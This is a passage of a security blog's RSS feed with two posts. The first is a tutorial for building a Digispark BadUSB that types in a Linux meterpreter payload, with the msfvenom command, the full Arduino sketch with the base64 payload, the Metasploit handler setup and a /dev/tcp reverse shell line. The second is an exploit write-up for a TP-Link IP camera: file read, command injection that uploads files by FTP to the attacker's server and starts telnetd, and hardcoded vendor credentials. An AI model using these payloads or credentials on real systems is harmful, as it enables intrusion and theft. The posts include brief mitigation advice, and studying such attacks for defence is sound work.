+										<content:encoded><![CDATA[<h1>Exploiting with BadUSB / Digispark + meterpreter payload</h1>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/20170222_192323.jpg"><img decoding="async" class="wp-image-715 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/20170222_192323.jpg" alt="" width="407" height="276"></a><br />
+Here is a small guide on how to create a BadUSB &#8211; stick with a meterpreter payload to Linux. BadUSB can be a normal USB memory stick with a customized firmware that&#8217;ll have the computer to recognize the device as a keyboard. Because of this, the computer thinks that&nbsp;there&#8217;s always a user typing on the keyboard, which is a pretty nasty exploit and enablse a lot of possibilities. For example, with physical access to the victims computer you can do following things with BadUSB:</p>
+<ul>
+<li>Inject malware</li>
+<li>Steal passwords</li>
+<li>Delete files</li>
+<li>etc&#8230;whatever you can do with a keyboard, a BadUSB can do also.</li>
+</ul>
+<p>Of course, you could buy&nbsp;a <a href="https://hakshop.com/collections/usb-rubber-ducky">Rubber Ducky from Hak5</a>&nbsp;, but you&#8217;d miss all the fun tinkering with cool things. This guide is made for Digispark from <a href="http://digistump.com/">Digistump</a>.<br />
+Digispark can be programmed so that when the computer accepts it as a keyboard, it starts to send key presses to computer. Since Digispark has only 8Kb (6Kb of programmable space after bootloader), options are somewhat limited, but should be&nbsp;more than enough for most purposes and it&#8217;s also possible to circumvent the space limit.</p>
+<h2>0x00 Pre-requisities:</h2>
+<ul>
+<li><a href="http://digistump.com/products/1">Digispark</a>&nbsp;, a low cost (~8$ at the time of writing this)&nbsp;USB development board</li>
+<li><a href="https://www.arduino.cc/en/main/software">Arduino-IDE</a> (<a href="http://digistump.com/wiki/digispark/tutorials/connecting">install guide here</a>)</li>
+<li><a href="https://www.kali.org/">Kali &#8211; Linux</a></li>
+</ul>
+<h2>0x01 Install Arduino-IDE</h2>
+<p>Since the installation guide is excellent in the digistump.com site, I will not even try to recreate them in detail here. <a href="http://digistump.com/wiki/digispark/tutorials/connecting">Configure Arduino-IDE by these instructions</a>.<br />
+Just make sure you have added following URL to &#8220;Additional Boards Manager URLs:&#8221; (<em>File</em> -&gt; <em>Preferences</em>):</p>
+<pre>http://digistump.com/package_digistump_index.json</pre>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/arduino-ide-preferences.png"><img decoding="async" class="wp-image-719 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/arduino-ide-preferences.png" alt="" width="638" height="518"></a><br />
+Also, install &#8220;<em>Digistump AVR Boards by Digistump</em>&#8221; via Boards manager (<em>Tools</em> -&gt; <em>Boards</em> -&gt; <em>Boards Manager</em>)&#8230;<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/arduino-ide-boards-manager.png"><img decoding="async" class="wp-image-722 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/arduino-ide-boards-manager.png" alt="" width="604" height="340"></a><br />
+And select &#8220;<em>Digispark (Default &#8211; 16.5mhz)</em>&#8221; as a board.<br />
+Arduino-IDE should now be good to go.</p>
+<h2>0x02 Generating a meterpreter payload</h2>
+<p>Generation of the payload is pretty straightforward. It&#8217;s generated with &#8220;<em>msfvenom</em>&#8221; as follows.</p>
+<pre>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.8 LPORT=880 -f elf &gt; mShell_880</pre>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/msfvenom.png"><img decoding="async" class="size-full wp-image-727 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/msfvenom.png" alt="" width="1009" height="114"></a><br />
+Of course, LPORT and the LHOST should be changed to match your IP-addresses. LHOST should be the Kali box where the metasploit handler is waiting for the connection back from the victim and LPORT is the port you want to use. The output of the msfvenom is directed to file called &#8216;<em>mShell_880</em>&#8216;. The output of the executable payload is only 155 bytes, so we have plenty of space left.<br />
+Since the payload is &#8220;typed&#8221; to victim, it has to be Base64 encoded, so we can &#8220;input&#8221; it to victim and generate the executable payload. Basically, what we want to do, is to echo the Base64 string and decode it and direct the output to a file, change the executable bit for the file and run the payload.<br />
+Base64 encoding is done as follows:</p>
+<pre>base64 mShell_880 &gt; mShell_880.b64</pre>
+<p>&#8220;<em>mShell_880.b64</em>&#8221; &#8211; file now holds our payload encoded in Base64. We can use this string in our program that outputs it to victims terminal.<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/base64_encoded_payload.png"><img decoding="async" class=" wp-image-742 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/base64_encoded_payload.png" alt="" width="616" height="72"></a></p>
+<h2>0x03 Programming with Arduino-IDE</h2>
+<p>The program is&nbsp;very simple and straightforward. I commented the program below, so it should be very clear what is done. On default, it works only with US &#8211; keyboard layout, but it&#8217;s possible to remap the keyboard layout from &#8220;<em>DigiKeyboard.h</em>&#8221; &#8211; file. Since this is for PoC only, I don&#8217;t include any other layouts in this post. Sorry <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<pre>/*
+* Works with US - keyboard layout only, because of testing purposes.
+*
+* 1. Send super key ('Windows key') to bring up the search
+* 2. input 'terminal' and send enter
+* 3. Send our binary payload via base64 encoded string, decode it and output to file
+* 4. Change executable bit for the payload and execute it.
+* 5. Enjoy.
+*/
+#include "DigiKeyboard.h"
+void setup() {
+// LED on.
+pinMode(1, OUTPUT);
+delay(200);
+// Super, delete content
+// Start to inject payload, turn the LED on
+digitalWrite(1, HIGH);
+DigiKeyboard.sendKeyStroke(KEY_DELETE); // Clean
+delay(200);
+DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); // Super key, open 'search'
+delay(300);
+DigiKeyboard.print("terminal"); // Program to run
+delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+// Delay for 1 second, if terminal is not opened, part of the string below is wasted to /dev/null
+delay(1000);
+// Send our payload
+DigiKeyboard.print("echo");
+DigiKeyboard.sendKeyStroke(KEY_SPACE);
+DigiKeyboard.print("f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1toCgAACGgCAANwieFqZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E= | base64 --decode &amp;gt; /tmp/mShell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(500);
+// Change the permissions for the file...
+DigiKeyboard.println("chmod 755 /tmp/mShell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(200);
+// ...and execute it
+DigiKeyboard.println("/tmp/mShell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(100);
+// Payload executed!
+digitalWrite(1, LOW);
+}
+void loop() {
+// When scripts are done, blink some LED like it's 19
+digitalWrite(1, HIGH);
+delay(200);
+digitalWrite(1, LOW);
+delay(300);
+}
+</pre>
+<p>Now, it&#8217;s possible to check the code for errors from Arduino-IDE by clicking &#8220;<em>Sketch</em> =&gt; <em>Verify/Compile</em>&#8221; (or by pressing CTRL + R on the Arduino-IDE). If no errors found, the program is ready to be uploaded to Digispark by first clicking &#8220;<em>Sketch</em> =&gt;&nbsp;<em>Upload</em>&#8221; (or by pressing CTRL + U on the Arduino IDE) and you should get a following info on the bottom of the IDE window.<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/ArduinoIDE-upload.png"><img decoding="async" class=" wp-image-747 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/ArduinoIDE-upload.png" alt="" width="505" height="96"></a><br />
+Now the Digispark can be inserted to a USB port on the computer. After a while, the update should go through and you should see following info.<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/ArduinoIDE-uploaded.png"><img decoding="async" class="size-full wp-image-748 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/ArduinoIDE-uploaded.png" alt="" width="253" height="105"></a><br />
+The programming of the Digispark is now ready and it now is a &#8216;BadUSB&#8217;.<br />
+Note: I had some problems with the uploading. Sometimes it takes a few tries to get a succesful program upload to Digispark, don&#8217;t yet know why..</p>
+<h2>0x04 Metasploit, multi/handler</h2>
+<p>Now multi/handler is setup to catch the meterpreter shell.&nbsp;Payload is &#8220;<em>linux/x86/meterpreter/reverse_tcp</em>&#8220;, since the generated payload<br />
+The whole point of this is guide is to demonstrate how dangerous it is to plug in USB sticks. Keep in mind that normal USB stick firmwares can also be reprogrammed like this and it doesn&#8217;t necessary help that they are formatted.<br />
+multi/handler can simply be setup from the terminal with following command:</p>
+<pre>msfconsole -x "use multi/handler;\
+set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
+set LHOST 10.0.0.8;\
+set LPORT 880;\
+set AutoRunScript multi_console_command -rc /root/autoruncommands.rc
+exploit"</pre>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/meterpreter_ready_to_catch_the_fly.png"><img decoding="async" class=" wp-image-745 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/meterpreter_ready_to_catch_the_fly.png" alt="" width="564" height="205"></a></p>
+<h2>0x05 The Exploitation</h2>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/20170222_192405.jpg"><img decoding="async" class=" wp-image-751 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/20170222_192405.jpg" alt="" width="494" height="287"></a><br />
+Now we are ready to test the BadUSB we have just created. When the Digispark / BadUSB is now inserted to linux computer, it should open the dashboard/search, open terminal, echo the Base64 encoded payload and decode it to file, change the executable bit for the payload file and run it. When the payload is run,&nbsp;multi/handler gets the shell. Here is a video recorded when the Digispark / BadUSB is inserted in to the linux computer. In the image above, you can see both LEDs from the Digispark are lighted, when the payload on the Digispark is executed.<br />
+Top right corner: syslog from &#8216;victim&#8217;, it&#8217;s visible when the BadUSB / Digispark is plugged in<br />
+Lower right corner: multi/handler from attacking server</p>
+<div class='avia-iframe-wrap'><iframe title="badUSB (Digispark) + meterpreter payload" width="1333" height="1000" src="https://www.youtube.com/embed/W-UPinvtevs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
+<h2>0x06 Mitigation</h2>
+<p>As for mitigation, for Windows, there is a program called &#8216;<a href="https://jlospinoso.github.io/infosec/usb%20rubber%20ducky/lan%20turtle/c%23/clr/wpf/.net/security/2016/11/30/beamgun-update-poison-tap.html"><em>Beamgun</em></a>&#8216; (haven&#8217;t tested it yet). Of course as for Windows, Linux, OSX you could always disable USB ports, create scripts that prevent adding new hardware etc., but if you really need USB devices, that would be pretty cumbersome in the long run. And of course&#8230;don&#8217;t plug untrusted devices to your computer and don&#8217;t let anybody plug unknown USB devices to your computer. There is also a physical, small box called &#8216;<a href="http://www.usbguard.fi/">USBguard</a>&#8216; (also not tested in this experiment), that should block these kinds of attacks.</p>
+<h2>0x07 Conclusion</h2>
+<p>BadUSB stick could also be created with a normal USB drive (e.g. &#8216;Rubber ducky&#8217; from Hak5) and this shows how bad effects plugging &#8216;found&#8217; USB stick can have. Payload could also be something more nasty, e.g. wipe the whole drive from the computer.<br />
+It&#8217;s also possible to create payloads for Windows and OSX. For OSX, you can get a shell using for example following payload after you have launched a shell:</p>
+<pre>DigiKeyboard.print("/bin/bash -i &gt; /dev/tcp/10.0.0.8/880 0&lt;&amp;1 2&gt;1");</pre>
+<p>I&#8217;ll post example codes for Windows and OSX also when I have time to tinker some more.</p>
+<p>(Original article:&nbsp;<a href="https://www.vesiluoma.com/exploiting-with-badusb-meterpreter-digispark/">https://www.vesiluoma.com/exploiting-with-badusb-meterpreter-digispark/</a> )</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploiting-with-badusbdigispark-meterpreter-payload/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>TP-Link TL-SC3171G IP-camera r00t</title>
+		<link>/tp-link-tl-sc3171g-ip-camera-r00t/</link>
+					<comments>/tp-link-tl-sc3171g-ip-camera-r00t/#respond</comments>
+		
+		<dc:creator><![CDATA[jvesiluoma]]></dc:creator>
+		<pubDate>Fri, 17 Feb 2017 00:11:08 +0000</pubDate>
+				<category><![CDATA[Exploitation]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[Writeup]]></category>
+		<guid isPermaLink="false">http://blog.rot.fi/?p=688</guid>
+
+					<description><![CDATA[Hacking TP-Link TL-SC3171G IP-camera and gaining root access.]]></description>
+										<content:encoded><![CDATA[<h1 style="text-align: center;">TP-Link TL-SC3171G IP-camera r00t</h1>
+<hr>
+<p><a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image001.png"><img decoding="async" class="size-full wp-image-641 aligncenter" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image001.png" alt="" width="270" height="364"></a><br />
+I have few of these and due to recent hackings of ip – cameras and IoT devices, I decided to take a look at my own cameras (that are behind NAT by the way)… It was an interesting thing to do some research on these devices and they were actually very easy to pop.<br />
+Here is a method to root the device. Browsers connection was through Burp Suite so I could intercept and check the requests back and forth between the device and my browser. Of course, OWASP ZAP or something similar could also be used to do this.<br />
+<a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image002.jpg"><img decoding="async" class=" wp-image-642 alignnone" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image002.jpg" alt="" width="718" height="357"></a><br />
+<em>TP-Link TL-SC3171G IP-camera main settings view.</em><br />
+When browsing through the the web interface, I ended up to a page that showed devices syslog. Interesting.<br />
+<a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image003.jpg"><img decoding="async" class=" wp-image-643 alignnone" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image003.jpg" alt="" width="683" height="462"></a><br />
+When checking the requests that were made to that page, I noticed that there was a very interesting request made to the device. It seems like the file is given as a parameter…<br />
+<a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image004.png"><img decoding="async" class=" wp-image-644 alignnone" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image004.png" alt="" width="699" height="291"></a><br />
+”<strong>READ.filePath=syslog”</strong> ? I changed that parameter to ”/etc/hosts” – file and noticed that I could read files from the device file system. Any file.<br />
+<a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image005.png"><img decoding="async" class="wp-image-645 alignnone" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image005.png" alt="" width="695" height="179"></a><br />
+Now this would already be bad, more if I would have the knowledge for all the config files on this embedded system…<br />
+After some enumeration, I didn’t find any ’jackpot’, so I moved on…After few minutes of research I found another interesting request that was made when testing the SMTP option on the device.</p>
+<p style="text-align: center;"><a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image006.png"><img decoding="async" class=" wp-image-646 aligncenter" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image006.png" alt="" width="721" height="579"></a></p>
+<p>#1: I found a request that enabled me to write files anywhere I would like on the device. Thought this didn’t help me much, since I didn’t know where the cgi-bin was and there were no open ssh/telnet ports etc.<br />
+<img decoding="async" class=" wp-image-647 aligncenter" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image007.jpg" alt="" width="765" height="271"><br />
+#2: that same ”Test” option sended another request. It compiled a command from the info user had filled to the form.</p>
+<p style="text-align: center;"><a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image008.png"><img decoding="async" class=" wp-image-648 aligncenter" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image008.png" alt="" width="757" height="291"></a></p>
+<p>As can be seen from the Response, the email-test command is composed from the sended values. After some tests I found out that the device had ’wput’ command (that was clear based on the FTP connection tests via devices admin page). I was able to upload all files to my own server with ’wput’, after I&nbsp; changed ”RcptToAddr1” value for example to…</p>
+<ul>
+<li><em>nonexisting@example.fi ; /bin/wput -t0 -u -nc -p -o/testftp.log /bin* </em><a href="ftp://xyz:xyz@10.0.0.8/"><em>ftp://xyz:xyz@10.0.0.8/</em></a><em>;</em>
+<ul>
+<li>Note 1: value had to be URL encoded so it goes through.</li>
+<li>Note 2: Probably all variables include RCE possibility on that request since they are not properly sanitized.</li>
+</ul>
+</li>
+</ul>
+<p style="text-align: center;"><a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image009.png"><img decoding="async" class=" wp-image-649 aligncenter" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image009.png" alt="" width="554" height="583"></a></p>
+<p>After I downloaded almost everything from the device ((/var/*, /etc/*, /web/*, /root/*, /usr/*, /bin/* /sbin/*…) through the FTP connection, I researched the files and noticed that there was telnetd in the busybox version included in the device. I once again modified the command through the email command (of course, in URL encoded format):</p>
+<ul>
+<li><em>xyz@x00.fi; /bin/telnetd ;</em></li>
+</ul>
+<p>And the gates were open…now port 23 answered:</p>
+<p style="text-align: center;"><a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image010.jpg"><img decoding="async" class=" wp-image-650 aligncenter" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image010.jpg" alt="" width="312" height="101"></a></p>
+<p>After few tests I noticed that the default user is ’qmik’ (argh, it says ”<em>QMIK login”…</em>) and the user had sudo rights.</p>
+<p style="text-align: center;">&nbsp;&nbsp;&nbsp;<a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image011.jpg"><img decoding="async" class=" wp-image-651 aligncenter" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image011.jpg" alt="" width="501" height="227"></a> <a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image012.jpg"><img decoding="async" class=" wp-image-652 aligncenter" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image012.jpg" alt="" width="545" height="93"></a></p>
+<p>Of course, prerequisite is that one would have access to the email test page and that requires admin rights to the device. But no worries, after some enumeration of files, I noticed that there is hardcoded credentials in the device ( <em>manufacture</em> / <em>erutcafunam </em>)…<br />
+Oh, and that IP-camera doesn&#8217;t use any CSRF tokens, so it&#8217;s also possible to get your camera hacked by just visiting some malicious sites (if you&#8217;re logged in to the camera). Oh yes, and did you notice that the camera uses basic HTTP auth? That means your browser stays logged in until you close the browser.</p>
+<p style="text-align: center;"><a href="http://www.vesiluoma.com/wp-content/uploads/2017/01/image013.jpg"><img decoding="async" class=" wp-image-653 aligncenter" src="http://www.vesiluoma.com/wp-content/uploads/2017/01/image013.jpg" alt="" width="688" height="190"></a></p>
+<p style="text-align: left;">&#8211; apox</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/tp-link-tl-sc3171g-ip-camera-r00t/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
